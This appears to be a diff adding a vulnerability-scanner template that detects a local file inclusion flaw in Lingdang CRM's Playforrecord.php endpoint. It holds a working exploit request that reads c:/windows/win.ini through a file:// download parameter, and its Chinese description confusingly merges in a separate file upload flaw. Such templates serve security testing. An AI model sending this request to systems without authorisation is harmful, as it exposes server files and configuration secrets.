@@ -1,0 +1,25 @@
+id: ldcrm-playforrecord-lfi
+
+info:
+  name: Lingdang CRM Playforrecord.php - Local File Inclusion
+  author: qwtd
+  severity: high
+  description: |
+    灵当CRM系统接口wechatSession文件上传漏洞，允许攻击者上传恶意文件到服务器灵当CRM系统接口Playforrecord.php接口处存在任意文件读取漏洞，允许攻击者通过恶意读取系统配置文件，获取敏感信息。
+  reference:
+    - https://github.com/eeeeeeeeee-code/POC/blob/main/wpoc/%E7%81%B5%E5%BD%93CRM/%E7%81%B5%E5%BD%93CRM%E7%B3%BB%E7%BB%9F%E6%8E%A5%E5%8F%A3Playforrecord%E6%8E%A5%E5%8F%A3%E5%A4%84%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E.md
+  tags: 灵当CRM
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/crm/modules/Accounts/Playforrecord.php?download=file:///c:/windows/win.ini"
+      
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "bit app support"
+          - "fonts"
+          - "extensions"
+        condition: and
